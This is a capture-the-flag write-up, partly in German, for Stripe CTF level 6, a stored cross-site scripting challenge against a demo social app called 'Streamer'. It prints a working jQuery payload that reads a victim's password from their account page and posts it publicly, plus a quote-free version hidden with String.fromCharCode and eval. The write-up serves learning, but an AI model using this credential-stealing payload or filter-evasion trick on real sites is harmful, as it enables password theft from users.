LEVEL 06
========

XSS vulnerability, only ' & " are not allowed, add < script >.

    $.get('https://level06-2.stripe-ctf.com/user-XXXX/user_info',
      function(data) {
        var password = /Password:<\/th>\s+<td>(.+)<\/td>/.exec(data)[1];
        var res = '';
        for (var i = 0; i < password.length; i++) {
          res += password.charCodeAt(i) + ", ";
        }
        console.log(res);
        $("#content").val(res);
        $("#new_post").submit();
      })

Escape with JavaScript String.charCodeAt()

[http://www.w3schools.com/jsref/jsref_charcodeat.asp](http://www.w3schools.com/jsref/jsref_charcodeat.asp)
[http://www.w3schools.com/jsref/jsref_fromcharcode.asp](http://www.w3schools.com/jsref/jsref_fromcharcode.asp)
[http://www.w3schools.com/jsref/jsref_eval.ASP](http://www.w3schools.com/jsref/jsref_eval.ASP)
[http://jdstiles.com/java/cct.html](http://jdstiles.com/java/cct.html)

---

After Karma Trader from Level 4 was hit with massive karma inflation (purportedly due to someone flooding the market with massive quantities of karma), the site had to close its doors. All hope was not lost, however, since the technology was acquired by a real up-and-comer, Streamer. Streamer is the self-proclaimed most steamlined way of sharing updates with your friends. You can access your Streamer instance here: https://level06-2.stripe-ctf.com/user-XXXX

The Streamer engineers, realizing that security holes had led to the demise of Karma Trader, have greatly beefed up the security of their application. Which is really too bad, because you've learned that the holder of the password to access Level 7, level07-password-holder, is the first Streamer user.

As well, level07-password-holder is taking a lot of precautions: his or her computer has no network access besides the Streamer server itself, and his or her password is a complicated mess, including quotes and apostrophes and the like.

Fortunately for you, the Streamer engineers have decided to open-source their application so that other people can run their own Streamer instances. You can obtain the source for Streamer at git clone https://level06-2.stripe-ctf.com/user-XXXX/level06-code. We've also included the most important files below.

---

Aus dem Quelltext kann man lesen, dass sowohl ' als auch " in jeglichen Eingabefeldern zu einem 500 Internal Server Error führen - eine SQL Injection kann man also schon ausschließen. Interessant ist, dass in der _views/home.erb_ der @username direkt in das Javascript geschrieben wird. Das können wir ausnutzen, indem wir unseren Username pimpen - das gleiche funktioniert hier übrigens genau so mit Posttitel und Postbody... Wie auch immer. Weil sich hier der Nutzer, auf dessen Passwort wir scharf sind, auch alle paar Minuten einloggt ist mal wieder eine Cross Server Scripting Vulnerability präsent. Wir müssen also ein Javascript schreiben, dass in einen Post passt, ausgeführt wird, die URL user_info aufruft, das Passwort von dort parsed und in die Timeline postet. Einziges Hindernis: wir dürfen in keinem Textfeld ' oder " verwenden... Der Ausweg aus diesem Problem ist so einfach, dass man meistens gar nicht daran denkt... Jedes Char in unserem String hat eine Nummer!  Durch die Methoden charCodeat() und fromCharCode() können wir unser Script in eine Reihe von zahlen umwandeln, mit eval() können wir das so geparste Script ausführen.

    $.get('https://level06-2.stripe-ctf.com/user-XXXX/user_info',
      function(data) {
        var password = /Password:<\/th>\s+<td>(.+)<\/td>/.exec(data)[1];
        var res = '';
        for (var i = 0; i < password.length; i++) {
          res += password.charCodeAt(i) + ", ";
        }
        console.log(res);
        $("#content").val(res);
        $("#new_post").submit();
      })

Das Script parsed also das Passwort von der user_info Seite, wandelt es in seine Charcodes um und postet es in die Timeline. Ohne Umwandlung in die Charcodes geht es nicht, da das Passwort es paranoiden Users aus Sonderzeichen inklusive ' und " besteht. (Siehe Beschreibungstext) Ganz einfach lässt sich das Script über diese Seite umwandeln: [http://jdstiles.com/java/cct.html](http://jdstiles.com/java/cct.html)
So würde es bspw. am Ende aussehen:

    </script><script>eval(String.fromCharCode(36, 46, 103, 101, 116, 40, 39, 104, 116, 116, 112, 115, 58, 47, 47, 108, 101, 118, 101, 108, 48, 54, 45, 50, 46, 115, 116, 114, 105, 112, 101, 45, 99, 116, 102, 46, 99, 111, 109, 47, 117, 115, 101, 114, 45, 103, 100, 110, 105, 112, 121, 97, 106, 99, 118, 47, 117, 115, 101, 114, 95, 105, 110, 102, 111, 39, 44, 10, 32, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 100, 97, 116, 97, 41, 32, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 112, 97, 115, 115, 119, 111, 114, 100, 32, 61, 32, 47, 80, 97, 115, 115, 119, 111, 114, 100, 58, 60, 92, 47, 116, 104, 62, 92, 115, 43, 60, 116, 100, 62, 40, 46, 43, 41, 60, 92, 47, 116, 100, 62, 47, 46, 101, 120, 101, 99, 40, 100, 97, 116, 97, 41, 91, 49, 93, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 114, 101, 115, 32, 61, 32, 39, 39, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 118, 97, 114, 32, 105, 32, 61, 32, 48, 59, 32, 105, 32, 60, 32, 112, 97, 115, 115, 119, 111, 114, 100, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 114, 101, 115, 32, 43, 61, 32, 112, 97, 115, 115, 119, 111, 114, 100, 46, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 40, 105, 41, 32, 43, 32, 34, 44, 32, 34, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 99, 111, 110, 115, 111, 108, 101, 46, 108, 111, 103, 40, 114, 101, 115, 41, 59, 10, 32, 32, 32, 32, 36, 40, 34, 35, 99, 111, 110, 116, 101, 110, 116, 34, 41, 46, 118, 97, 108, 40, 114, 101, 115, 41, 59, 10, 32, 32, 32, 32, 36, 40, 34, 35, 110, 101, 119, 95, 112, 111, 115, 116, 34, 41, 46, 115, 117, 98, 109, 105, 116, 40, 41, 59, 10, 32, 32, 125, 41));</script><script>

Fügen wir das nun in einen Post ein und warten ab, so wird unser Opfer unwissentlich sein Passwort posten. Abfragen können wir es dann bequem über _ajax/posts_, ohne dass wir selbst unser Passwort erneut posten.